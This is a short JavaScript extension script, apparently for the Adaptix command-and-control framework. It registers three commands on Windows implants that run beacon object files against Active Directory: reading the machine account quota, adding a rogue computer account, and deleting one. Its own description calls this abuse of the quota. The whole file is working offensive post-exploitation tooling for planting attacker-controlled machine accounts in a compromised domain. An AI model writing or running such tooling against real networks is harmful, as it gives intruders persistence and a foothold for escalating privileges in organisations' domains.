var metadata = {
    name: "MachineAccounts",
    description: "Abuse AD machine quota to add/remove rogue machine accounts"
};

var cmd_getquota = ax.create_command("GetMachineAccountQuota", "Read the ms-DS-MachineAccountQuota value from Active Directory", "GetMachineAccountQuota");
cmd_getquota.setPreHook(function (id, cmdline, parsed_json) {
    var bof_path = ax.script_dir() + "GetMachineAccountQuota." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: read MachineAccountQuota from AD");
});

var cmd_addmachine = ax.create_command("AddMachineAccount", "Add a computer account to the Active Directory domain", "AddMachineAccount <computername> [password]");
cmd_addmachine.addArgString("accountname", true,  "Computer account name (without trailing $)");
cmd_addmachine.addArgString("password",    false, "Optional password for the new machine account");
cmd_addmachine.setPreHook(function (id, cmdline, parsed_json) {
    var accountname = parsed_json["accountname"];
    var password    = parsed_json["password"] || "";
    var bof_path    = ax.script_dir() + "AddMachineAccount." + ax.arch(id) + ".o";

    var bof_params;
    if (password === "") {
        bof_params = ax.bof_pack("wstr", [accountname]);
    } else {
        bof_params = ax.bof_pack("wstr,wstr", [accountname, password]);
    }
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `Task: add machine account ${accountname}`);
});

var cmd_delmachine = ax.create_command("DelMachineAccount", "Remove a computer account from the Active Directory domain", "DelMachineAccount <computername>");
cmd_delmachine.addArgString("accountname", true, "Computer account name to delete");
cmd_delmachine.setPreHook(function (id, cmdline, parsed_json) {
    var accountname = parsed_json["accountname"];
    var bof_params  = ax.bof_pack("wstr", [accountname]);
    var bof_path    = ax.script_dir() + "DelMachineAccount." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `Task: delete machine account ${accountname}`);
});

var group_machineaccounts = ax.create_commands_group("MachineAccounts-BOF", [cmd_getquota, cmd_addmachine, cmd_delmachine]);
ax.register_commands_group(group_machineaccounts, ["beacon", "gopher", "kharon"], ["windows"], []);
